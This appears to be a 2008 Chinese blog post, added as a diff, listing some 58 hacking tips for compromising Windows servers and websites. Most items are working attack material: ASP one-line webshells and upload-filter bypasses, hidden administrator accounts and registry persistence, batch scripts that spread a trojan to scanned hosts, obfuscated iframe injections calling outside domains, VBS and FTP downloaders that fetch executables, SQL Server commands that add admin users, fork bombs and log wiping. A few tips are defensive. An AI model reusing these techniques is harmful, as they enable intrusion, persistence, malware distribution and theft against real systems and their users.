@@ -1,0 +1,476 @@
+2008年07月12日 星期六 15:27
+
+1、Xp系统修改权限防止病毒或木马等破坏系统，cmd下，
+cacls C:\windows\system32 /G hqw20:R
+思是给hqw20这个用户只能读取SYSTEM32目录，但不能进行修改或写入
+恢复方法：C:\>cacls C:\windows\system32 /G hqw20:F
+
+2、用Microsoft自带的IExpress工具作的捆绑木马可以躲过很多杀毒软件，运行对话框中输入Iexpress。
+
+3、内网使用灰鸽子，肉鸡上vidcs.exe -p端口，本地VIDCS里，VIDCS服务IP 填肉鸡的IP，VIDCS服务端口，就是给肉鸡开的端口，BINDIP添自己的内网IP，BIND端口 添8000，映射端口添8000。
+
+4、建立隐藏帐号，上次总结了用guest建立隐藏的管理员，这次再介绍一种，在cmd下建立一个ating$的用户，然后注册表下复制管理员的1F4里的F 值到ating$的F值，再把ating$改为$,这样在计算机管理的用户里看不到这个隐藏帐号
+
+5、利用INF文件来修改注册表
+[Version]
+Signature="$CHICAGO$"
+[Defaultinstall]
+addREG=Ating
+[Ating]
+HKCU,"Software\Microsoft\Windows\CurrentVersion\Policies\system","disableregistrytools","0x00010001","1"
+以上代码保存为inf格式，注意没有换行符，在命令行里导入inf的命令如下：
+rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 inf文件的具体路径
+其中HKEY_CLASSES_ROOT 简写为 HKCR，HKEY_CURRENT_USER 简写为 HKCU
+HKEY_LOCAL_MACHINE 简写为 HKLM，HKEY_USERS 简写为 HKU
+HKEY_CURRENT_CONFIG 简写为 HKCC
+0x00000000 代表的是 字符串值，0x00010001 代表的是 DWORD值
+"1"这里代表是写入或删除注册表键值中的具体数据
+
+6、关于制作穿xp2防火墙的radmin，大家一定要会，各大黑客网站都有动画,
+多了一步就是在防火墙里添加个端口，然后导出其键值
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List]
+
+7、系统启动时Alerter服务启动前启动木马程序ating.exe,此方法很隐蔽
+在[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Image File Execution Options]下建立service.exe项，再在service.exe项建立一个Debugger的键（字符串值），键值填ating.exe的全路径。
+
+8、将ftp.exe传到服务器用来提权，可以先把它变成ating.gif格式的再用，迷惑管理员。
+
+9、有时候在我们进入了网站后台，但是没有上传图片和备份等功能，得不到webshell,
+可是不能白来一场，可以看看发表公告或新闻支不支持html和script,支持的话加个frame马或者其他的什么。
+
+10、用google帮我们找网站后台,搜索”filetype:asp site:www.hack6.com inurl:login”
+
+11、我们中了盗密码的木马后不要急于删除，一般这些木马都是把密码发到指定邮箱，我们可以用探嗅软件来找到邮箱的用户名和密码，比如安全焦点的xsniff，
+用法：xsniff –pass –hide –log pass.txt
+
+12、google搜索的艺术
+搜索关键字：“未闭合的引号”或“ADODB.Field.error”或“Either BOF or EOF in True”
+或“字符串的语法错误”可以找到很多sql注入漏洞。
+
+13、还可以搜一些木马的关键字，比如搜索“管理登陆 海洋顶端 inurl:asp”,搜到了说明此网站服务器的其中网站肯定有漏洞。
+
+14、cmd中输入 nc –vv –l –p 1987
+做个bat文件内容为sqlhello 起始ip 1433 终止ip 1987 扫鸡吃
+
+15、制作T++木马，先写个ating.hta文件,内容为
+<script language="VBScript">
+set wshshell=createobject ("wscript.shell" )
+a=wshshell.run("你马的名称",1)
+window.close
+</script>
+再用mshta生成T++木马，命令为mshta ating.hta ating.t++,用网页木马生成器生成网页木马。
+
+16、搜索栏里输入
+关键字%'and 1=1 and '%'='
+关键字%'and 1=2 and '%'='
+比较不同处 可以作为注入的特征字符
+
+17、挂马代码<html>
+<iframe src="马的地址" width="0" height="0" frameborder="0"></iframe>
+</html>
+
+18、开启regedt32的SAM的管理员权限检查HKEY_LOCAL_MACHINE\SAM\SAM\和HKEY_LOCAL_MACHINE\SAM\SAM\下的管理员和guest的F键值,如果一样就是用被入侵过了,然后删了guest帐号,对方可以用guest帐号使用administraeors的权限,你也可以用这方法留住肉鸡, 这方法是简单克隆,
+net localgroup administrators还是可以看出Guest是管理员来。
+
+19、软件instsrv.exe 把.exe文件做成系统服务来启动 用来肉鸡挂QQ等
+用法: 安装： instsrv.exe 服务名称 路径
+卸载： instsrv.exe 服务名称 REMOVE
+
+
+21、SQL注入时工具---Internet选项---高级里找到显示友好的错误信息勾去掉
+不能注入时要第一时间想到%5c暴库。
+
+22、很多网站程序(比如华硕中文官方网站)上传图片时有可能在检测文件的时候是 从左朝又进行检测，也就是说，他会检测文件是不是有.jpg，那么我们要是把文件改成：ating.jpg.asp试试。。由于还是ASP结尾，所以木马不会变~
+
+23、缺少xp_cmdshell时
+尝试恢复EXEC sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll'
+假如恢复不成功,可以尝试直接加用户(针对开3389的)
+declare @o int
+exec sp_oacreate 'wscript.shell',@o out
+exec sp_oamethod @o,'run',NULL,'cmd.exe /c net user ating ating /add' 再提到管理员
+
+24.批量种植木马.bat
+for /f %%i in (扫描地址.txt) do copy pc.exe %%i\admin$ 复制木马到扫描的计算机当中
+for /f %%i in (扫描地址.txt) do at %%i 09:50 pc.exe 在对方计算机上运行木马的时间
+扫描地址.txt里每个主机名一行 用\\开头
+
+25、在程序上传shell过程中，程序不允许包含<% %>标记符号的内容的文件上传,比如蓝屏最小 的asp木马<%execute request("l")%>,我们来把他的标签换一下： <script language=VBScript runat=server>execute request("l")</Script> 保存为.asp,程序照样执行。
+
+26、IIS6 For Windows 2003 Enterprise Edition 如IIS发布目录文件夹包含.asp后辍名.
+将.asp后辍改为.jpg或其它的如.htm,也可以运行asp,但要在.asp文件夹下.
+.cer 等后缀的文件夹下都可以运行任何后缀的asp木马
+
+27、telnet一台交换机 然后在telnet控制主机 控制主机留下的是交换机的IP
+然后用#clear logg和#clear line vty *删除日志
+
+28、电脑坏了省去重新安装系统的方法
+纯dos下执行，
+xp:copy C:\WINDOWS\repair\*.* 到 c:\windows\system32\config
+2k: copy C:\winnt\repair\*.* 到 c:\winnt\system32\config
+
+29、解决TCP/IP筛选 在注册表里有三处，分别是：
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip
+分别用
+regedit -e D:\a.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip
+regedit -e D:\b.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip
+regedit -e D:\c.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip
+命令来导出注册表项
+然后把三个文件里的EnableSecurityFilters"=dword:00000001，
+改成EnableSecurityFilters"=dword:00000000 再将以上三个文件分别用
+regedit -s D:\a.reg regedit -s D:\b.reg regedit -s D:\c.reg 导入注册表即可。
+
+30、使CHM木马无法在本地运行木马程序 将注册表"HKEY_CURRENT_U
+SER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"下的1004项的值由原来十进制的0改为十六进制的3
+
+31、全手工打造开3389工具
+打开记事本，编辑内容如下：
+echo [Components] > c:\sql
+echo TSEnable = on >> c:\sql
+sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\sql /q
+编辑好后存为BAT文件，上传至肉鸡，执行
+
+32、挂马js代码document.write('<iframe height=0 width=0 src="木马地址.htm"></iframe>');保存到js页面里 可让所有页面挂马
+
+33、让服务器重启
+写个bat死循环:
+@echo off
+:loop1
+cls
+start cmd.exe
+goto loop1
+保存成bat guset权限就可以运行 运行后很快服务器就会死机 管理员自然会去重启
+
+34、如果你登录肉鸡的3389时发现有cmd一闪而过，那你可要小心了，管理员写了个bat在监视你，
+@echo off
+date /t >c:/3389.txt
+time /t >>c:/3389.txt
+attrib +s +h c:/3389.bat
+attrib +s +h c:/3389.txt
+netstat -an |find "ESTABLISHED" |find ":3389" >>c:/3389.txt
+并保存为3389.bat
+打开注册表找到：Userinit这个键值 在末尾加入3389.bat所在的位置，比如我放到C盘，就写：,c:/3389.bat,注意一定要加个逗号
+
+35、有时候提不了权限的话，试试这个命令，在命令行里输入：
+start http://www.hack520.org/muma.htm然后点执行。（muma.htm是你上传好的漏洞网页）
+输入：netstat -an | find "28876" 看看是否成功绑定，如果有就telnet上去，就有了system权限，当然也可以nc连接，本地执行命令。
+
+36、在cmd下用ftp上传马方法,我们可以用echo 写一个批处理文件
+echo open 你的FTP空间地址 >c:\1.bat //输入你的FTP地址
+echo 你的FTP账号 >>c:\1.bat //输入账号
+echo 你的FTP密码 >>c:\1.bat //输入密码
+echo bin >>c:\1.bat //登入
+echo get 你的木马名 c:\ ating.exe >>c:\1.bat //下载某文件到某地方并改名为什么
+echo bye >>c:\1.bat //退出
+然后执行ftp -s:c:\1.bat即可
+
+37、修改注册表开3389两法
+（1）win2000下开终端 首先用ECHO写一个3389.reg文件,然后导入到注册表
+echo Windows Registry Editor Version 5.00 >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] >>3389.reg
+echo "Enabled"="0" >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+NT\CurrentVersion\Winlogon] >>3389.reg
+echo "ShutdownWithoutLogon"="0" >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
+>>3389.reg
+echo "EnableAdminTSRemote"=dword:00000001 >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
+>>3389.reg
+echo "TSEnabled"=dword:00000001 >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] >>3389.reg
+echo "Start"=dword:00000002 >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService]
+>>3389.reg
+echo "Start"=dword:00000002 >>3389.reg
+echo [HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] >>3389.reg
+echo "Hotkey"="1" >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+Server\Wds\rdpwd\Tds\tcp] >>3389.reg
+echo "PortNumber"=dword:00000D3D >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+Server\WinStations\RDP-Tcp] >>3389.reg
+echo "PortNumber"=dword:00000D3D >>3389.reg
+把这些ECHO代码到CMDSHELL下贴粘就可以生成3389.reg文件，接着regedit /s 3389.reg导入注册表。
+(如果要改变终端端口只须把上面的两个D3D都改一下就可以了)
+因为win 2k下开终端不能像XP一样可以立即生效,而是需重启机器后才生效
+（2）winxp和win2003终端开启
+用以下ECHO代码写一个REG文件：
+echo Windows Registry Editor Version 5.00>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+Server]>>3389.reg
+echo "fDenyTSConnections"=dword:00000000>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+Server\Wds\rdpwd\Tds\tcp]>>3389.reg
+echo "PortNumber"=dword:00000d3d>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+Server\WinStations\RDP-Tcp]>>3389.reg
+echo "PortNumber"=dword:00000d3d>>3389.reg
+然后regedit /s 3389.reg del 3389.reg
+XP下不论开终端还是改终端端口都不需重启
+
+38、找到SA密码为空的肉鸡一定要第一时间改SA密码，防止别人和我们抢肉吃
+用查询分析器运行 EXEC sp_password NULL, '你要改的密码', 'sa'
+
+39、加强数据库安全 先要声明把mdb改成asp是不能防止下载的！
+（1）数据库文件名应复杂并要有特殊字符
+（2）不要把数据库名称写在conn.asp里，要用ODBC数据源
+将conn.asp文档中的
+DBPath = Server.MapPath("数据库.mdb")
+conn.Open "driver={Microsoft Access Driver (*.mdb)};dbq=" ＆ DBPath
+
+修改为：conn.open "ODBC数据源名称," 然后指定数据库文件的位置
+（3）不放在WEB目录里
+
+40、登陆终端后有两个东东很危险，query.exe和tsadmin.exe要Kill掉
+可以写两个bat文件
+@echo off
+@copy c:\winnt\system32\query.exe c:\winnt\system32\com\1\que.exe
+@del c:\winnt\system32\query.exe
+@del %SYSTEMROOT%\system32\dllcache\query.exe
+@copy c:\winnt\system32\com\1\query.exe c:\winnt\system32\query.exe //复制一个假的
+
+@echo off
+@copy c:\winnt\system32\tsadmin.exe c:\winnt\system32\com\1\tsadmin.exe
+@del c:\winnt\system32\tsadmin.exe
+@del %SYSTEMROOT%\system32\dllcache\tsadmin.ex
+
+41、映射对方盘符
+telnet到他的机器上，
+net share 查看有没有默认共享 如果没有，那么就接着运行
+net share c$=c:
+net share现在有c$
+在自己的机器上运行
+net use k: \\*.*.*.*\c$ 把目标共享映射到本地硬盘，盘符为K
+
+42、一些很有用的老知识
+type c:\boot.ini ( 查看系统版本 )
+net start (查看已经启动的服务)
+query user ( 查看当前终端连接 )
+net user ( 查看当前用户 )
+net user 用户 密码/add ( 建立账号 )
+net localgroup administrators 用户 /add (提升某用户为管理员)
+ipconfig -all ( 查看IP什么的 )
+netstat -an ( 查看当前网络状态 )
+findpass 计算机名 管理员名 winlogon的pid (拿到管理员密码)
+克隆时Administrator对应1F4
+guest对应1F5
+tsinternetuser对应3E8
+
+43、如果对方没开3389，但是装了Remote Administrator Service
+用这个命令F:\ftp.exe "regedit -s F:\longyi.biz\RAdmin.reg" 连接
+解释：用serv-u漏洞导入自己配制好的radmin的注册表信息
+先备份对方的F:\ftp.exe "regedit -e F:\1.reg HKEY_LOCAL_MACHINE\SYSTEM\RAdmin"
+
+44、用lcx做内网端口映射，先在肉鸡上监听 lcx -listen 52 8089 (端口自定）
+本地上运行映射，lcx -slave 鸡的ip 52 我内网的ip 80 (我的WEB是80端口）
+
+45、在服务器写入vbs脚本下载指定文件（比如用nbsi利用注入漏洞写入）
+echo Set x= CreateObject(^"Microsoft.XMLHTTP^"):x.Open
+^"GET^",LCase(WScript.Arguments(0)),0:x.Send():Set s =
+CreateObject(^"ADODB.Stream^"):s.Mode = 3:s.Type =
+1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 >ating.vbs
+（这是完整的一句话，其中没有换行符）
+然后下载:
+cscript down.vbs http://www.hack520.org/hack.exe hack.exe
+
+46、一句话木马成功依赖于两个条件：
+１、服务端没有禁止adodb.Stream或FSO组件
+２、权限问题：如果当前的虚拟目录禁止user级或everyone写入的话也是不会成功的。
+
+47、利用DB_OWNER权限进行手工备份一句话木马的代码：
+;alter database utsz set RECOVERY FULL--
+;create table cmd (a image)--
+;backup log utsz to disk = 'D:\cmd' with init--
+;insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253EDA)--
+;backup log utsz to disk = 'D:\utsz_web\utsz\hacker.asp'--
+注：0x3C25657865637574652872657175657374282261222929253EDA为一句话木马的16进制形式。
+
+48、tlntadmn是telnet服务的设置命令，可以对telnet服务的端口、认证方式等进行设置：
+
+用法: tlntadmn [computer name] [common_options] start | stop | pause | continue | -s | -k | -m | config config_options
+所有会话用 'all'。
+-s sessionid 列出会话的信息。
+-k sessionid 终止会话。
+-m sessionid 发送消息到会话。
+
+config 配置 telnet 服务器参数。
+
+common_options 为:
+-u user 指定要使用其凭据的用户
+-p password 用户密码
+
+config_options 为:
+dom = domain 设定用户的默认域
+ctrlakeymap = yes|no 设定 ALT 键的映射
+timeout = hh:mm:ss 设定空闲会话超时值
+timeoutactive = yes|no 启用空闲会话。
+maxfail = attempts 设定断开前失败的登录企图数。
+maxconn = connections 设定最大连接数。
+port = number 设定 telnet 端口。
+sec = [+/-]NTLM [+/-]passwd
+设定身份验证机构
+fname = file 指定审计文件名。
+fsize = size 指定审计文件的最大尺寸(MB)。
+mode = console|stream 指定操作模式。
+auditlocation = eventlog|file|both
+指定记录地点
+audit = [+/-]user [+/-]fail [+/-]admin
+
+49、例如:在IE上访问:
+www.hack520.org/hack.txt就会跳转到http://www.hack520.org/
+hack.txt里面的代码是：
+<body> <META HTTP-EQUIV="Refresh" CONTENT="5;URL=http://www.hack520.org/">
+把这个hack.txt发到你空间就可以了！
+这个可以利用来做网马哦！
+
+50、autorun的病毒可以通过手动限制！
+1，养成好习惯，插入U盘或移动硬盘，都要按住shift让其禁止自动运行！
+2，打开盘符用右键打开！切忌双击盘符～
+3，可以利用rar软件查看根目录下autorun病毒并删除之！他可以处理一些连右键都无法打开的分区！
+
+51、log备份时的一句话木马：
+a).<%%25Execute(request("go"))%%25>
+b).<%Execute(request("go"))%>
+c).%><%execute request("go")%><%
+d).<script language=VBScript runat=server>execute request("sb")</Script>
+e).<%25Execute(request("l"))%25>
+f).<%if request("cmd")<>"" then execute request("pass")%>
+
+52、at "12:17" /interactive cmd
+执行后可以用AT命令查看新加的任务
+用AT这个命令以交互的方式运行cmd.exe 这样运行的cmd.exe是system权限。
+
+53、隐藏ASP后门的两种方法
+1、建立非标准目录：mkdir images..\
+拷贝ASP木马至目录：copy c:\inetpub\wwwroot\dbm6.asp c:\inetpub\wwwroot\images..\news.asp
+通过web访问ASP木马：http://ip/images../news.asp?action=login
+如何删除非标准目录：rmdir images..\ /s
+2、Windows中的IIS会对以.asp结尾的目录中的文件进行解析，以达到我们隐藏自己的网页后门的目的:
+mkdir programme.asp
+新建1.txt文件内容：<!--#include file=”12.jpg”-->
+新建12.jpg文件内容：<%execute(request("l"))%> 或使用GIF与ASP合并后的文件
+attrib +H +S programme.asp
+通过web访问ASP一句话木马：http://ip/images/programme.asp/1.txt
+
+54、attrib /d /s c:\windows +h +s，后windows目录变为隐藏＋系统，隐藏属性为灰不可更改，windows目录下面的文件和目录并没有继承属性，原来是什么样还是什么样。
+然后在利用attrib /d /s c:\windows -h -s，windows目录可以显示，隐藏属性可以再次选中。
+
+55、JS隐蔽挂马
+1.
+var tr4c3="<iframe src=ht";
+tr4c3 = tr4c3+"tp:/";
+tr4c3 = tr4c3+"/ww";
+tr4c3 = tr4c3+"w.tr4";
+tr4c3 = tr4c3+"c3.com/inc/m";
+tr4c3 = tr4c3+"m.htm style="display:none"></i";
+tr4c3 =tr4c3+"frame>'";
+document.write(tr4c3);
+避免被管理员搜索网马地址找出来。把变量名定义的和网站本身的接近些，混淆度增加。
+
+2.
+转换进制，然后用EVAL执行。如
+eval("\144\157\143\165\155\145\156\164\56\167\162\151\164\145\40\50\42\74\151\146\162\141\155\145\40\163\162\143\75\150\164\164\160\72\57\57\167\167\167\56\164\162\64\143\63\56\143\157\155\57\151\156\143\57\155\155\56\150\164\155\40\163\164\171\154\145\75\42\42\144\151\163\160\154\141\171\72\156\157\156\145\42\42\76\74\57\151\146\162\141\155\145\76\42\51\73");
+不过这个有点显眼。
+3.
+document.write ('<iframe src=http://www.tr4c3.com/inc/mm.htm style="display:none"></iframe>');
+最后一点，别忘了把文件的时间也修改下。
+
+56.3389终端入侵常用DOS命令
+taskkill taskkill /PID 1248 /t
+
+tasklist 查进程
+
+cacls "C:\Program Files\ewido anti-spyware 4.0\guard.exe" /d:everyone 改、降低某文件权限
+iisreset /reboot
+tsshutdn /reboot /delay:1    重起服务器
+
+logoff 12 要使用会话 ID（例如，会话 12）从会话中注销用户，
+
+query user 查看当前终端用户在线情况
+
+要显示有关所有会话使用的进程的信息，请键入：query process *
+
+要显示有关会话 ID 2 使用的进程的信息，请键入：query process /ID:2
+
+要显示有关服务器 SERVER2 上所有活动会话的信息，请键入：query session /server:SERVER2
+
+要显示有关当前会话 MODEM02 的信息，请键入：query session MODEM02
+
+命令列:rundll32.exe user.exe,restartwindows 功能: 系统重启
+
+命令列:rundll32.exe user.exe,exitwindows 功能: 关闭系统
+
+命令列: rundll32.exe user.exe,restartwindows 功能: 强行关闭所有程式并重启机器。
+
+命令列: rundll32.exe user.exe,exitwindows 功能: 强行关闭所有程式并关机
+
+56、在地址栏或按Ctrl+O，输入：
+javascript:s=document.documentElement.outerHTML;document.write('<body></body>');document.body.innerText=s;
+
+源代码就出来了。不论加密如何复杂，最终都要还原成浏览器可以解析的html代码，而documentElement.outerHTML正是最终的结果。
+
+57、net user的时候，是不能显示加$的用户，但是如果不处理的话，
+用net localgroup administrators是可以看到管理组下，加了$的用户的。
+
+58、 sa弱口令相关命令
+
+一.更改sa口令方法：
+用sql综合利用工具连接后，执行命令：
+exec sp_password NULL,'20001001','sa'
+(提示：慎用!)
+
+二.简单修补sa弱口令.
+
+方法1:查询分离器连接后执行：
+if exists (select * from
+dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]') and
+OBJECTPROPERTY(id, N'IsExtendedProc') = 1)
+
+exec sp_dropextendedproc N'[dbo].[xp_cmdshell]'
+
+GO
+
+然后按F5键命令执行完毕
+
+方法2:查询分离器连接后
+第一步执行：use master
+第二步执行：sp_dropextendedproc 'xp_cmdshell'
+然后按F5键命令执行完毕
+
+
+三.常见情况恢复执行xp_cmdshell.
+
+
+1 未能找到存储过程'master..xpcmdshell'.
+   恢复方法：查询分离器连接后,
+第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int
+第二步执行:sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
+然后按F5键命令执行完毕
+
+2 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
+恢复方法：查询分离器连接后,
+第一步执行：sp_dropextendedproc "xp_cmdshell"
+第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
+然后按F5键命令执行完毕
+
+3 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
+恢复方法：查询分离器连接后,
+第一步执行:exec sp_dropextendedproc 'xp_cmdshell'
+第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'           
+然后按F5键命令执行完毕
+
+四.终极方法.
+如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:
+查询分离器连接后,
+2000servser系统:
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user 用户名 密码 /add'
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators 用户名 /add'
+
+xp或2003server系统:
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user 用户名 密码 /add'
+
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators 用户名 /add'
